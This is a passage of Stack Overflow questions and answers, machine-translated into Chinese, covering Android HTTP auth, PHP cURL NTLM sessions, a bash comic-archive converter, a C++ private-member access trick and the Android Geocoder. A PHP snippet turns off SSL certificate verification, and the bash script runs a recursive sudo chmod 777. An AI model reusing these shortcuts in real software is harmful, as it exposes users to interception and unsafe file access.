    UsernamePasswordCredentials credentials = new UsernamePasswordCredentials(user,pass);
    this.httpClient.getCredentialsProvider().setCredentials(scope, credentials);
} 
```

So I think loopj might also run into the problem of using the old HttpClient 3.x way of doing Basic Authentication. It does work, but it's not preemptive.

A straightforward solution will be download the source code of loopj and modify its source and use the modified version.

Modification in code would be:

```
 httpClient.setBasicAuth(ApplicationConstants.userName,
            ApplicationConstants.password); 
```

instead of

```
 httpClient.setBasicAuth(ApplicationConstants.userName,
            ApplicationConstants.password, new AuthScope(
                    "http://*.*.*.*:8080/uploadservice", 80,
                    AuthScope.ANY_REALM)); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-27T12:07:08.450

我想您可以通过显式添加处理基本身份验证的标头来解决此问题。

```
Context context = this;
String url = "http://*.*.*.*:8080/someurl";

UsernamePasswordCredentials credentials = 
new UsernamePasswordCredentials(ApplicationConstants.userName,
            ApplicationConstants.password);

Header header = BasicScheme.authenticate(credentials, "UTF-8", false);

Header[] headers = {header};

RequestParams params = new RequestParams();

httpClient.get(context, url, headers, params, new AsyncHttpResponseHandler(){ .. 
```

如果您想知道服务器响应是什么，也不要忘记覆盖“onComplete”方法。因为在异常情况下它可能不会通过“onSuccess”和“onFailure”..

# extjs - 如何在sencha touch中为条形图提供渐变颜色和为图表背景提供虚线

> ID：15110499
> 
> 赞同：1
> 
> 时间：2013-02-27T11:06:48.900
> 
> 标签：extjs, sencha-touch-2, extjs4.1, sencha-charts

谁能告诉如何在sencha touch中为条形图提供渐变颜色和为图表背景提供虚线

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-05T16:25:49.520

渐变是使用对象的[渐变](http://docs.sencha.com/extjs/4.0.7/#!/api/Ext.chart.Chart-cfg-gradients)配置参数完成的`Ext.chart.Chart`。

# mingw - 配置 mingw32 和 MSYS（从 /mingw/bin 执行二进制文件时出错）

> ID：15110505
> 
> 赞同：0
> 
> 时间：2013-02-27T11:07:03.503
> 
> 标签：mingw, msys

我已经安装了 MSYS，并配置了 /mingw/bin 目录的路径。但是当我执行 gcc、g++ 或 /mingw/bin 文件夹中的任何命令时，会出现以下错误。

```
$ ./x86_64-w64-mingw32-g++
  ./x86_64-w64-mingw32-g++: ./x86_64-w64-mingw32-g++: cannot execute binary file 
```

我已经使用`mingw-w64-bin_x86_64-linux_20121031.tar.bz2`了文件，并使用 WinRar 实用程序将其解压缩..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:11:53.093

通常，当您遇到`cannot execute binary`文件时，这是因为 exe 无法在您的系统上运行。假设您在 Windows 上，可能是因为您使用了错误的 MSYS 包（并且 tar 文件中的 linux 接缝很奇怪......）。尝试像[这里](http://sourceforge.net/projects/mingw/files/Installer/mingw-get-inst/mingw-get-inst-20120426/)一样获取 MinGW 的可执行包并在其中安装所需的所有组件。你可以按照[这里](http://www.mingw.org/wiki/MSYS)的教程。

**编辑**为正确答案。

# php - 带有 cURL 的 PHP NTLM 会话

> ID：15110507
> 
> 赞同：4
> 
> 时间：2013-02-27T11:07:07.280
> 
> 标签：php, curl, active-directory, ldap, ntlm

所以先说一点琐事..

有一个用 ASP.NET 编写的网站，它使用 NTLM 协议对想要登录的用户进行身份验证。他们通常使用它时完全可以，他们输入网站 URL，他们提供他们的凭据，在 Web 浏览器中进行身份验证和维护会话。

我想做的是创建将充当机器人的 PHP 网站。这是我公司的内部网站，我被批准这样做。我遇到的问题是管理会话。用户将能够在我的 PHP 网站中输入他们的凭据，我的 PHP 网站将使用 cURL 对目标站点进行身份验证。

到目前为止我得到的代码是：

```
 $cookie_file_path = dirname(__FILE__) . '/cookies.txt';
    $ch = curl_init();

    //==============================================================
     curl_setopt($ch, CURLOPT_USERPWD, $username. ':' . $password);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
     curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
     curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLINFO_HEADER_OUT, true);
     curl_setopt($ch, CURLOPT_FAILONERROR, 0);
     curl_setopt($ch, CURLOPT_MAXREDIRS, 100);
    //=============================================================
    $ret = curl_exec($ch); 
```

上面的代码通过 cURL 登录到目标网站（它似乎管理 NTLM 握手），并获取网站内容。它还存储在 cookie 文件中发回的会话 ID。

我接下来要做的是评论该`CURLOPT_USERPWD`选项，希望此脚本将使用存储在 cookie 文件中的会话 ID 在此脚本的第二次执行中验证先前登录的用户。它可以摆脱用户凭据并且不以这种方式将其存储在任何地方，因为将其存储在手动创建的会话、数据库或其他任何地方都不安全。

我需要这个，因为机器人将使用 CRON 定期检查网站状态是否已更改并执行一些用户操作作为对此的反应。但是要做到这一点，首先必须对用户进行身份验证，并且他的用户名和密码不能存储在任何地方，所以我必须使用他最初登录时建立的会话信息。

CURL 似乎不这样做。当我使用注释选项第二次执行脚本时`CURLOPT_USERPWD`，它不使用存储的 cookie 来保持身份验证。相反，它会**重写**cookie 文件，其中包含从服务发送给我的不相关数据，作为对**未授权**访问请求的响应。

我的问题是：为什么 cURL 不使用存储的会话信息来保持身份验证？有什么方法可以使用基于 cURL 和 NTLM 协议的网站来维护这个会话？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:07:55.727

几个月前，我遇到了和你类似的问题。我试图连接到 navision soap api。Navision 使用 ntlm 身份验证。问题是 curl 不原生支持 ntlm 所以你必须自己做。

在这种情况下对我有很大帮助的博客文章如下：

[http://rabaix.net/en/articles/2008/03/13/using-soap-php-with-ntlm-authentication](http://rabaix.net/en/articles/2008/03/13/using-soap-php-with-ntlm-authentication)

** 编辑

对不起，我误读了你的问题。你的问题很简单。

只需使用此行从请求中接收标头

```
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
```

然后，您可以从 curl_exec 函数的结果中获取 Set-Cookie 标头。

```
preg_match('/^Set-Cookie:\s*([^;]*)/mi', $ret, $match);
$cookie = parse_url($match[0]); 
```

现在您可以将它存储在某个地方，并在 2ten 请求中使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-07-05T06:53:27.943

我有同样的问题，我使用`curl_setopt($ch, CURLOPT_COOKIEFILE, "");`代码行解决了它。字符串应该完全为**空**。

# php - 更改目录后 PHP CMS 不工作

> ID：15110513
> 
> 赞同：1
> 
> 时间：2013-02-27T11:07:22.550
> 
> 标签：php, html

我在服务器上的子目录中构建（使用教程）我的 CMS，它运行良好。管理、存档、完整显示和概要。

然后我将所有这些移到我的主目录中，将 index.php 文件名更改为另一个文件名，并使用“包含”将其显示在另一个页面的 DIV 中。

它显示页面的主要 index.php 元素，但在单击文章时不返回文章。

我已经搜索了文件以更改代码中“index.php”的任何实例，但没有。所有管理功能都运行良好，并且博客条目的输出 URL onclick 与上一个目录中的上一个文件相同。当然没有格式化，但这没问题。

我在哪一部分犯了错误？我想避免使用 iframe 来解决这个问题。

index.php 文件包含的代码。（主页.php）

```
<?php include "templates/include/header.php" ?>

  <ul id="headlines">

<?php foreach ( $results['articles'] as $article ) { ?>

    <li>
      <h2>
        <span class="pubDate"><?php echo date('j F', $article->publicationDate)?></span><a href=".?action=viewArticle&amp;articleId=<?php echo $article->id?>"><?php echo htmlspecialchars( $article->title )?></a>
      </h2>
        <p class="summary">
        <?php if ( $imagePath = $article->getImagePath( IMG_TYPE_THUMB ) ) { ?>
          <a href=".?action=viewArticle&amp;articleId=<?php echo $article->id?>"><img class="articleImageThumb" src="<?php echo $imagePath?>" alt="Article Thumbnail" /></a>
        <?php } ?>
      <?php echo htmlspecialchars( $article->summary )?>
      </p>       
       </li>

<?php } ?>

  </ul>

  <p><a href="./?action=archive">Archivo de Articulos</a></p>

<?php include "templates/include/footer.php" ?> 
```

# c - 比较文本文件中的字符串，然后打印出整行

> ID：15110516
> 
> 赞同：0
> 
> 时间：2013-02-27T11:07:24.580
> 
> 标签：c, string, text-files

如果该行包含与用户输入等效的字符串，我的目标是打印出文本文件中的每一整行。

我了解如何在文本文件中查找特定字符串的出现，但我对如何将其与特定行相关联感到困惑。如何将我的字符串与它所在的特定行联系起来？

我最初的想法是将每一行存储在一个数组中，然后如果用户字符串在该行中的某个位置，则打印出该行。

但是每一行的大小不同，所以我想知道我是否可以最初将整个文本文件分成 x 行，然后使用循环遍历每一行并搜索该字符串？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:19:39.433

在开始新行比较之前将行首的文件指针保存在临时变量中

# bash - 向 cbr cbz 转换 bash 脚本添加状态（文件完整性）检查

> ID：15110518
> 
> 赞同：4
> 
> 时间：2013-02-27T11:07:25.953
> 
> 标签：bash, zip, 7zip, rar

第一次发帖，嗨！首先让我说我是一个关于编程的菜鸟。我了解非常基本的东西，但是在检查退出代码或适当的术语是什么时，我不知所措。显然我的 searchfoo 在这方面真的很弱，我想这是一个术语问题。

*提前感谢您花时间阅读本文/回答我的问题！*

**说明**：我找到了一个将 .cbr 文件转换/重新打包为 .cbz 文件的[脚本。](http://comicrack.cyolito.com/forum/13-scripts/30013-cbr2cbz-rar-to-zip-conversion-for-linux "资源")这些文件基本上是您的普通[rar](https://en.wikipedia.org/wiki/Rar)和[zip](https://en.wikipedia.org/wiki/ZIP_%28file_format%29)文件，但是重命名为另一个扩展名，因为它们用于（漫画）书应用程序，例如[Comicrack](http://comicrack.cyolito.com/)、[qcomicbook](http://qcomicbook.org/overview)等等。令人惊讶的是，那里没有 cbr -> cbz 转换器。.cbz 的优点除了转义*专有*的rar 文件格式外，还可以使用 e存储来自[Comic Vine的元数据。](http://www.comicvine.com/)g[漫画家](https://code.google.com/p/comictagger/)。

**问题**：有时文件的重新打包并没有很好地结束，希望通过完整性检查和另一次尝试来缓解。我稍微修改了上述脚本以使用[p7zip](http://p7zip.sourceforge.net "基本上是 CLI 7-zip")，因为它可以打包/解包[7z](https://en.wikipedia.org/wiki/7z)、 zip-files 和[其他一些](http://www.7-zip.org "XZ、BZIP2、GZIP、TAR 和 WIM")文件，即。e 非常适合选择。p7zip 可以通过以下方式测试存档：

```
7z t comicfile.cbz tmpworkingdir 
```

我想这是使用 if & else here(?) 来检查完整性然后再试一次的问题，如果有任何错误。

## 问题/tl；博士：向下面的脚本添加完整性文件检查的“最佳”/适当方法是什么？

```
#!/bin/bash
#Source: http://comicrack.cyolito.com/forum/13-scripts/30013-cbr3cbz-rar-to-zip-conversion-for-linux
echo "Converting CBRs to CBZs"

# Set the "field separator" to something other than spaces/newlines" so that spaces
# in the file names don't mess things up. I'm using the pipe symbol ("|") as it is very
# unlikely to appear in a file name.
IFS="|"

# Set working directory where to create the temp dir. The user you are using must have permission
# to write into this directory.
# For performance reasons I'm using ram disk (/dev/shm/) in Ubuntu server.
WORKDIR="/dev/shm/"

# Set name for the temp dir. This directory will be created under WORDDIR
TEMPDIR="cbr2cbz"

# The script should be invoked as "cbr2cbz {directory}", where "{directory}" is the
# top-level directory to be searched. Just to be paranoid, if no directory is specified,
# then default to the current working directory ("."). Let's put the name of the
# directory into a shell variable called SOURCEDIR.
# Note: "$1" = "The first command line argument"
if test -z "$1"; then
        SOURCEDIR=`pwd`
else
        SOURCEDIR="$1"
fi

echo "Working from directory $SOURCEDIR"

# We need an empty directory to work in, so we'll create a temp directory here
cd "$WORKDIR"
mkdir "$TEMPDIR"
# and step into it
cd "$TEMPDIR"

# Now, execute a loop, based on a "find" command in the specified directory. The
# "-printf "$p|" will cause the file names to be separated by the pipe symbol, rather than
# the default newline. Note the backtics ("`") (the key above the tab key on US
# keyboards).
for CBRFILE in `find "$SOURCEDIR" -name "*.cbr" -printf "%p|while read line; do

    # Now for the actual work. First, extract the base file name (without the extension)
    # using the "basename" command. Warning: more backtics.
    BASENAME=`basename $CBRFILE ".cbr"`

    # And the directory path for that file, so we know where to put the finished ".cbz"
    # file.
    DIRNAME=`dirname $CBRFILE`

    # Now, build the "new" file name,
    NEWNAME="$BASENAME.cbz"

    # We use RAR file's name to create folder for unpacked files
    echo "Processing $CBRFILE"
    mkdir "$BASENAME"
    # and unpack the rar file into it
    7z x "$CBRFILE" -O"$BASENAME"
    cd "$BASENAME"

    # Lets ensure the permissions allow us to pack everything
    sudo chmod 777 -R ./*

# Put all the extracted files into new ".cbz" file
    7z a -tzip -mx=9 "$NEWNAME" *

    # And move it to the directory where we found the original ".cbr" file
    mv "$NEWNAME" $DIRNAME/"$NEWNAME"

    # Finally, "cd" back to the original working directory, and delete the temp directory
    # created earlier.
    cd ..
    rm -r "$BASENAME"

    # Delete the RAR file also
    rm "$CBRFILE"

done

# At the end we cleanup by removing the temp folder from ram disk
cd ..
echo "Conversion Done"
rm -r "$TEMPDIR" 
```

*哦，人性，在 10 个声望之前不要发布两个以上的链接，我把 OP 中的废话联系起来了。*

[编辑 2]*我删除了 unrar 作为依赖项并改用 p7zip，因为它可以提取 rar 文件。*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:59:56.387

您将需要两项检查：

1.  `7z t`将测试*存档的完整性*
2.  您还应该测试存档中所有图像文件的完整性。您可以为此使用[ImageMagick等工具。](http://www.imagemagick.org/script/index.php)

    一个简单的测试是`identify` *文件*，但它可能只读取标题。我会使用`convert` *文件* `-resize 5x5 png:- > /dev/null`

    这会将图像缩小到 5x5 像素，将其转换为 PNG，然后将结果通过管道传输`/dev/null`（丢弃）。对于缩放，必须读取整个图像。如果此命令因错误而失败，则图像文件有问题。

# c# - 如何按间隔更新部分cshtml共享布局？

> ID：15110520
> 
> 赞同：0
> 
> 时间：2013-02-27T11:07:37.563
> 
> 标签：c#, ajax, razor, asp.net-mvc-4, timer

当我的数据库有更新时，我想在我的共享布局中修改 div 的内容。最好的方法是什么？检查数据库的计时器+以某种方式从控制器更新视图？在视图 c# 函数中？ajax？（不太了解）或其他方式？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:15:17.983

使用 javascript 的 setTimeout 实用程序来获取计时器行为。

创建一个控制器动作及其关联的局部视图，其中将包含您需要动态加载的内容。您可以从视图中返回格式化的 Html，或者从控制器操作返回结构化的 Json 对象，无论哪个适合您。

考虑到您的关注是您的 DIV 标签。

```
<div id="dynamicContent"></div> 
```

采用

```
$(function(){
    var function updatecontent()
    {
         $("#dynamicContent").load(URL)

         setTimeout(updatecontent,5000);
    }

    setTimeout(updatecontent,5000);

}); 
```

要动态加载内容，url 将是
YourDomain.com/Controller/Action

```
$.load() 
```

will load the content of partial view using Ajax, and you will get a nice behavior on page.

# c++ - 允许访问私人成员

> ID：15110526
> 
> 赞同：5
> 
> 时间：2013-02-27T11:07:56.670
> 
> 标签：c++, class, templates, inheritance, private

这个问题在某种程度上是我发布的[这个](https://stackoverflow.com/questions/15100515/inherit-private-members-from-base-class#comment21258644_15100515)问题的延续。

**我想做的是**：我的意思是允许访问`A`派生类中基类的私有成员`B`，但有以下限制：

*   我想要访问的是一个结构——`std::map<>`实际上是一个——，而不是一个方法；
*   我**无法**修改基类；
*   基类`A`没有模板化方法，我可以作为后门替代方案重载——而且我不会添加这样的方法，因为它会*违反*第二个限制。

作为一种可能的解决方案，我已经指出了 litb 的解决方案（[帖子](https://stackoverflow.com/a/3173080/1655939)/[博客](http://bloglitb.blogspot.de/2011/12/access-to-private-members-safer.html)），但是，就我的一生而言，我无法理解这些帖子中所做的事情，因此，我可以无法解决我的问题。

**我正在尝试做**的事情：来自 litb 解决方案的以下代码提供了一种有关如何从类/结构访问私有成员的方法，它恰好涵盖了我提到的限制。

所以，我正在尝试重新排列这个代码：

```
template<typename Tag, typename Tag::type M>
struct Rob { 
  friend typename Tag::type get(Tag) {
    return M;
  }
};

// use
struct A {
  A(int a):a(a) { }
private:
  int a;
};

// tag used to access A::a
struct A_f { 
  typedef int A::*type;
  friend type get(A_f);
};

template struct Rob<A_f, &A::a>;

int main() {
  A a(42);
  std::cout << "proof: " << a.*get(A_f()) << std::endl;
} 
```

对于允许我执行以下操作的事情 - 请注意，我即将继承该类，因为在`std::map<>`派生类初始化之后立即添加了条目`B`，即，`std::map<>`不仅仅是类的静态成员`A`具有默认值，因此我需要从以下特定实例访问它`B`：

```
// NOT MY CODE -- library <a.h>
class A {
private:
    std::map<int, int> A_map;
};

// MY CODE -- module "b.h"
# include <a.h>
class B : private A {
public:
    inline void uncover() {
        for (auto it(A_map.begin()); it != A_map.end(); ++it) {
            std::cout << it->first << " - " << it->second << std::endl;
        }
    }
}; 
```

**我想要的答案是**：我真的*很想*让上面的代码工作——在适当的修改之后——但是我**很**满意解释第一个代码块中做了什么——来自 litb 的解决方案。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T13:34:23.397

不幸的是，博客文章及其代码有点不清楚。这个概念很简单：显式模板实例化可以免费在后台传递给任何类，因为

*   库类的显式实例化可能是客户端类的实现细节，并且
*   显式实例化只能在命名空间范围内声明。

分发此后台通行证的自然方式是作为指向成员的指针。如果您有一个指向给定类成员的指针，则可以在该类的任何对象中访问它，而不管访问资格如何。幸运的是，即使在 C++03 中，指向成员的指针也可以是编译时常量。

因此，我们想要一个在显式实例化时生成指向成员的指针的类。

显式实例化只是定义类的一种方式。仅仅生成一个类*怎么能做*一些事情呢？有两种选择：

*   定义一个`friend`函数，它不是类的成员。这就是 litb 所做的。
*   定义一个静态数据成员，它在启动时被初始化。这是我的风格。

我会先介绍我的风格，然后讨论它的缺点，然后修改它以匹配 litb 的机制。最终结果仍然比博客中的代码简单。

# 简单版。

该类接受三个模板参数：受限成员的类型、其实际名称和对全局变量的引用以接收指向它的指针。该类调度一个要初始化的静态对象，其构造函数初始化全局。

```
template< typename type, type value, type & receiver >
class access_bypass {
    static struct mover {
        mover()
            { receiver = value; }
    } m;
};

template< typename type, type value, type & receiver >
typename access_bypass< type, value, receiver >::mover
    access_bypass< type, value, receiver >::m; 
```

用法：

```
type_of_private_member target::* backstage_pass;
template class access_bypass <
    type_of_private_member target::*,
    & target::member_name,
    backstage_pass
>;

target t;
t.* backstage_pass = blah; 
```

[看到它的工作。](http://ideone.com/6f2agE)

不幸的是，在程序进入之前，您不能依赖此结果可用于其他源文件中的全局对象构造函数`main`，因为没有标准的方法可以告诉编译器以哪个顺序初始化文件。但是全局变量是按顺序初始化的他们被声明了，所以你可以把你的绕过放在顶部，只要静态对象构造函数不对其他文件进行函数调用，你就可以了。

# 强大的版本。

这通过添加标签结构和函数从 litb 的代码中借用了一个元素`friend`，但这是一个小的修改，我认为它仍然很清楚，并不比上面的差很多。

```
template< typename type, type value, typename tag >
class access_bypass {
    friend type get( tag )
        { return value; }
}; 
```

用法：

```
struct backstage_pass {}; // now this is a dummy structure, not an object!
type_of_private_member target::* get( backstage_pass ); // declare fn to call

// Explicitly instantiating the class generates the fn declared above.
template class access_bypass <
    type_of_private_member target::*,
    & target::member_name,
    backstage_pass
>;

target t;
t.* get( backstage_pass() ) = blah; 
```

[看到它的工作。](http://ideone.com/a34OQS)

这个强大的版本和 litb 的博客文章之间的主要区别在于，我已将所有参数收集到一个地方并将标签结构设为空。它只是相同机制的更简洁的接口。但是您必须声明该`get`函数，博客代码会自动执行该函数。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-27T11:35:23.603

好的，所以你问了如何让那个奇怪的“Rob”代码与你的用例一起工作，所以就是这样。

```
// the magic robber
template<typename Tag, typename Tag::type M>
struct Rob {
    friend typename Tag::type get(Tag) {
        return M;
    }
};

// the class you can't modify
class A {
private:
    std::map<int, int> A_map;
};

struct A_f {
    typedef std::map<int, int> A::*type;
    friend type get(A_f);
};

template struct Rob<A_f, &A::A_map>;

class B : private A {
public:
    inline void uncover() {
        std::map<int, int>::iterator it = (this->*get(A_f())).begin();
    }
}; 
```

现在，我个人认为这里的治疗方法可能比疾病更糟糕，尽管我通常是你看到的最后一个声称滥用 C++ 是可以的人。您可以自己决定，因此我将其发布为与我使用预处理器以老式方式完成的答案不同的答案。

编辑：

## 这个怎么运作

在这里，我将复制上面的代码，但简化了类型，并绘制了更多代码，并带有大量注释。请注意，在进行此练习之前，我对代码不是很了解，现在我还没有完全理解它，明天我当然不会记得它是如何工作的。警告维护者。

这是我们不允许更改的代码，使用私有成员：

```
// we can use any type of value, but int is simple
typedef int value_type;

// this structure holds value securely.  we think.
struct FortKnox {
    FortKnox() : value(0) {}
private:
    value_type value;
}; 
```

现在进行抢劫：

```
// define a type which is a pointer to the member we want to steal
typedef value_type FortKnox::* stolen_mem_ptr;

// this guy is sort of dumb, but he knows a backdoor in the standard
template<typename AccompliceTag, stolen_mem_ptr MemPtr>
struct Robber {
    friend stolen_mem_ptr steal(AccompliceTag) {
        return MemPtr; // the only reason we exist: to expose the goods
    }
};

// this guy doesn't know how to get the value, but he has a friend who does
struct Accomplice {
    friend stolen_mem_ptr steal(Accomplice);
};

// explicit instantiation ignores private access specifier on value
// we cannot create an object of this type, because the value is inaccessible
// but we can, thanks to the C++ standard, use this value in this specific way
template struct Robber<Accomplice, &FortKnox::value>;

// here we create something based on secure principles, but which is not secure
class FortKnoxFacade : private FortKnox {
public:
    value_type get_value() const {
        // prepare to steal the value
        // this theft can only be perpetrated by using an accomplice
        stolen_mem_ptr accessor = steal(Accomplice()); // it's over now
        // dereference the pointer-to-member, using this as the target
        return this->*accessor;
    }
};

int main() {
    FortKnoxFacade fort;
    return fort.get_value();
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-27T11:12:08.850

来点更残忍的怎么样？

```
// MY CODE -- module "b.h"
# define private protected
# include <a.h>
# undef private
class B : private A {
    // now you can access "private" members and methods in A 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-04-24T19:19:35.780

我所知道的这个成语的最佳打包版本如下：

```
template<class Tag,typename Tag::type MemberPtr>
struct access_cast{
 friend typename Tag::type get(Tag){return MemberPtr;};
};

template<class Tag,class MemberPtr>
struct access_tag{
 typedef MemberPtr type;
 friend type get(Tag);
};

class A {
public:
 auto x() const {return x_;};
private: 
 int x_ = 9;
};

#include <iostream>

struct AMemTag: access_tag<AMemTag,int A::*>{}; //declare tag
template struct access_cast<AMemTag,&A::x_>; //define friend get function

int main() {
 A a;
 std::cout<<a.x()<<"\n";
 a.*get(AMemTag()) = 4; //dereference returned member pointer and modify value
 std::cout<<a.x()<<"\n";
} 
```

[看到它的工作。](https://ideone.com/e6ncJr)

# android - 调用 geoCoder.getFromLocation() 时服务不可用

> ID：15110528
> 
> 赞同：33
> 
> 时间：2013-02-27T11:08:04.850
> 
> 标签：android, google-geocoder

我知道有时谷歌后端服务可能不可用。

因此，一个解决方案可能是循环直到我得到数据。

```
private class getLocationDetails extends AsyncTask<String, Void, String> {

    @Override
    protected String doInBackground(String... params) {

        Log.d("looping", "" + count + "");
        count++;
        double lat = Double.parseDouble(params[0]);
        double lng = Double.parseDouble(params[1]);
        List<Address> addresses = null;
        try {

            Geocoder gCoder = new Geocoder(ImageAndLocationActivity.this,
                    Locale.getDefault());
            addresses = gCoder.getFromLocation(lat, lng, 1);
            Address addr = addresses.get(0);
            user_country = addr.getCountryName();
            user_city = addr.getLocality();
            user_district = addr.getSubAdminArea();

            if (user_city == null) {

                user_city = user_district;
            }
        } catch (Exception e) {

            Log.e("Exception in getLocationDetails - ", e.getMessage());
            return null;
        }

        return "";
    }

    @Override
    protected void onPostExecute(String result) {

        if (result != null) {

            Log.d("user_city = ", "" + user_city);
        } else {

            new getLocationDetails().execute(CurrentLat + "", CurrentLng
                    + "");
        }
    }

    @Override
    protected void onPreExecute() {

    }

    @Override
    protected void onProgressUpdate(Void... values) {

    }
} 
```

但我根本无法获得位置：

**日志猫：**

```
02-27 16:29:49.568: D/looping(10966): 110355
02-27 16:29:49.568: E/Exception in getLocationDetails -(10966): Service not Available
02-27 16:29:49.573: D/looping(10966): 110356
02-27 16:29:49.573: E/Exception in getLocationDetails -(10966): Service not Available
02-27 16:29:49.573: D/looping(10966): 110357
02-27 16:29:49.573: E/Exception in getLocationDetails -(10966): Service not Available 
```

当然，我已经添加了所有需要的权限：

```
<uses-permission android:name="android.permission.INTERNET" /> 
```

我正在**三星 Galaxy Note GT-N7000（4.0.4 版）上尝试这个**

我是否缺少任何设置？与设备或应用程序有关？或者这通常会发生？如果是这样有更好的解决方案来解决这个问题吗？

谢谢你

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2013-02-27T12:33:45.020

`Geocoder`不起作用的实际原因是因为`NetworkLocator`在行动中被杀死。可能是由于内存较少，或者您使用任务管理器杀死了所有服务？

我不确定，但这是一个猜测。我以前见过这个。去年我写了一个重新连接机制来加载 NetworkLocator.apk 并绑定到`GeocoderService`. 我认为此更改尚未合并到 JellyBean 中，因此此问题仍然存在。

只有重启才能解决。（`NetworkLocationService`在启动时加载）

编辑：您不会在 JBP 或 KK 中看到此问题，此服务已移至 playstore 应用程序中。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-07-15T11:48:53.780

使用直接访问谷歌地图的解决方法：

```
 public static LatLng getLocationFromString(String address)
        throws JSONException {

    HttpGet httpGet = new HttpGet(
            "http://maps.google.com/maps/api/geocode/json?address="
                    + URLEncoder.encode(address, "UTF-8") + "&ka&sensor=false");
    HttpClient client = new DefaultHttpClient();
    HttpResponse response;
    StringBuilder stringBuilder = new StringBuilder();

    try {
        response = client.execute(httpGet);
        HttpEntity entity = response.getEntity();
        InputStream stream = entity.getContent();
        int b;
        while ((b = stream.read()) != -1) {
            stringBuilder.append((char) b);
        }
    } catch (ClientProtocolException e) {
    } catch (IOException e) {
    }

    JSONObject jsonObject = new JSONObject(stringBuilder.toString());

    double lng = ((JSONArray) jsonObject.get("results")).getJSONObject(0)
            .getJSONObject("geometry").getJSONObject("location")
            .getDouble("lng");

    double lat = ((JSONArray) jsonObject.get("results")).getJSONObject(0)
            .getJSONObject("geometry").getJSONObject("location")
            .getDouble("lat");

    return new LatLng(lat, lng);
}

    public static List<Address> getStringFromLocation(double lat, double lng)
        throws ClientProtocolException, IOException, JSONException {

    String address = String
            .format(Locale.ENGLISH,                                 "http://maps.googleapis.com/maps/api/geocode/json?latlng=%1$f,%2$f&sensor=true&language="
                            + Locale.getDefault().getCountry(), lat, lng);
    HttpGet httpGet = new HttpGet(address);
    HttpClient client = new DefaultHttpClient();
    HttpResponse response;
    StringBuilder stringBuilder = new StringBuilder();

    List<Address> retList = null;

    response = client.execute(httpGet);
    HttpEntity entity = response.getEntity();
    InputStream stream = entity.getContent();
    int b;
    while ((b = stream.read()) != -1) {
        stringBuilder.append((char) b);
    }

    JSONObject jsonObject = new JSONObject(stringBuilder.toString());

    retList = new ArrayList<Address>();

    if ("OK".equalsIgnoreCase(jsonObject.getString("status"))) {
        JSONArray results = jsonObject.getJSONArray("results");
        for (int i = 0; i < results.length(); i++) {
            JSONObject result = results.getJSONObject(i);
            String indiStr = result.getString("formatted_address");
            Address addr = new Address(Locale.getDefault());
            addr.setAddressLine(0, indiStr);
            retList.add(addr);
        }
    }

    return retList;
} 
```

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2014-11-26T09:22:05.220

重新启动设备，它将解决问题。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-02-27T11:13:26.497

如果设备上此类服务不可用，API 将抛出“服务不可用异常”。使用方法`isPresent()`检查服务是否存在。

另请参阅：http: [//developer.android.com/reference/android/location/Geocoder.html](http://developer.android.com/reference/android/location/Geocoder.html)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2014-10-31T08:24:06.850

如果原始 Geocoder 失败，最好的解决方法是使用与 Google Geocoder 类相同的类

```
List<Address> addresses = null;    
Geocoder geocoder = new Geocoder(this);
addresses = geocoder.getFromLocation(...);
if (addresses == null || addresses.isEmpty())
addresses = MyGeocoder.getFromLocation(...);

import android.location.Address;
import android.util.Log;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.params.AllClientPNames;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class MyGeocoder {

    public static List<Address> getFromLocation(double lat, double lng, int maxResult) {

        String address = String.format(Locale.ENGLISH, "http://maps.googleapis.com/maps/api/geocode/json?latlng=%1$f,%2$f&sensor=false&language=" + Locale.getDefault().getCountry(), lat, lng);
        HttpGet httpGet = new HttpGet(address);
        HttpClient client = new DefaultHttpClient();
        client.getParams().setParameter(AllClientPNames.USER_AGENT, "Mozilla/5.0 (Java) Gecko/20081007 java-geocoder");
        client.getParams().setIntParameter(AllClientPNames.CONNECTION_TIMEOUT, 5 * 1000);
        client.getParams().setIntParameter(AllClientPNames.SO_TIMEOUT, 25 * 1000);
        HttpResponse response;

        List<Address> retList = null;

        try {
            response = client.execute(httpGet);
            HttpEntity entity = response.getEntity();
            String json = EntityUtils.toString(entity, "UTF-8");

            JSONObject jsonObject = new JSONObject(json);

            retList = new ArrayList<Address>();

            if ("OK".equalsIgnoreCase(jsonObject.getString("status"))) {
                JSONArray results = jsonObject.getJSONArray("results");
                if (results.length() > 0) {
                    for (int i = 0; i < results.length() && i < maxResult; i++) {
                        JSONObject result = results.getJSONObject(i);
